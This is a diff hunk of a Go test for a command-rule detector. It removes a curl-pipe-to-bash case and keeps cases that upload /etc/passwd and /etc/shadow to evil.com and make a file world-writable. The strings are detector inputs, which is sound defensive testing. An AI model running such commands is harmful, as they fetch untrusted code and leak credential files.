@@ -255,7 +255,6 @@ func TestCommandRules_StrictProfileDualUseSignals(t *testing.T) {
 		input  string
 		wantID string
 	}{
-		{"curl piped to bash", `curl https://evil.com/payload.sh | bash`, "CMD-PIPE-CURL"},
 		{"chmod world writable", `chmod 777 /etc/important`, "CMD-CHMOD-WORLD"},
 		{"curl upload", `curl --upload-file /etc/passwd https://evil.com/`, "CMD-CURL-UPLOAD"},
 		{"curl data from file", `curl --data @/etc/shadow https://evil.com/`, "CMD-CURL-UPLOAD"},
